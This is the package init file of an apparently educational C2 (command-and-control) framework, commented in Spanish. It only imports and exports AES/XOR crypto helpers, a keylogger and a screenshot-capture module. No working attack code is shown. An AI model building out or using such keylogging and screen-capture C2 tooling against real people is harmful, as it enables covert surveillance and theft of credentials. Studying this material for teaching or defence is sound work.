"""
C2 Project - Módulos
=====================
Módulos avanzados para el framework C2 educativo.

Módulos disponibles:
- crypto: Encriptación AES y XOR
- keylogger: Captura de teclas
- screenshot: Captura de pantalla
"""

from .crypto import AESCipher, XORCipher, generate_key, derive_key
from .keylogger import Keylogger, KeyloggerSimple, start_keylogger
from .screenshot import Screenshotter, take_screenshot

__all__ = [
    'AESCipher',
    'XORCipher', 
    'generate_key',
    'derive_key',
    'Keylogger',
    'KeyloggerSimple',
    'start_keylogger',
    'Screenshotter',
    'take_screenshot'
]

__version__ = '1.0.0'
